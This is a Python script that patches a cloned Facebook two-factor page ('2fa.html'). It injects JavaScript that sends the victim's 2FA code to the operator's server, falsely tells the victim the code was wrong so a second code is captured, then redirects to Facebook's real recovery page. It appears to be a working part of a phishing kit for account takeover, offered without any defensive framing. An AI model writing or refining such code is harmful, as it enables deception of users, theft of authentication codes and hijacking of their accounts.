
import os

file_path = '/Users/p.thuyen/Documents/ProjectFBTUan/2fa.html'

with open(file_path, 'r', encoding='utf-8') as f:
    content = f.read()

# Replace form
old_form = '<form action="" method="GET">'
new_form = '<form id="fa_form" onsubmit="event.preventDefault(); handle2FA();">'
if old_form in content:
    content = content.replace(old_form, new_form)
    print("Form tag replaced.")
else:
    print("Warning: Form tag not found!")

# Append script
script_code = """
<script>
    let step = 1;
    function handle2FA() {
        const codeInput = document.getElementById('_r_a_');
        const code = codeInput ? codeInput.value : '';
        
        if (!code) return; // Don't submit empty

        fetch('/2fa', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ code: code, step: step })
        })
        .then(response => response.json())
        .then(data => {
            if (data.action === 'reload') {
                step = 2;
                if (codeInput) codeInput.value = ''; // Clear input
                alert('The code you entered is incorrect. Please check your SMS/Authenticator and try again.');
            } else if (data.action === 'complete') {
                window.location.href = 'https://www.facebook.com/recover/initiate/';
            }
        })
        .catch(err => console.error('Error:', err));
    }
    
    document.addEventListener('DOMContentLoaded', () => {
        // Bind to Continue button
        const buttons = Array.from(document.querySelectorAll('[role="button"]'));
        const continueBtn = buttons.find(el => el.textContent.includes('Continue'));
        
        if (continueBtn) {
            continueBtn.addEventListener('click', () => {
                handle2FA();
            });
        }
    });
</script>
"""

if '</body>' in content:
    content = content.replace('</body>', script_code + '</body>')
    print("Script appended.")
else:
    # If no body tag (weird), append to end
    content += script_code
    print("Script appended to end.")

with open(file_path, 'w', encoding='utf-8') as f:
    f.write(content)
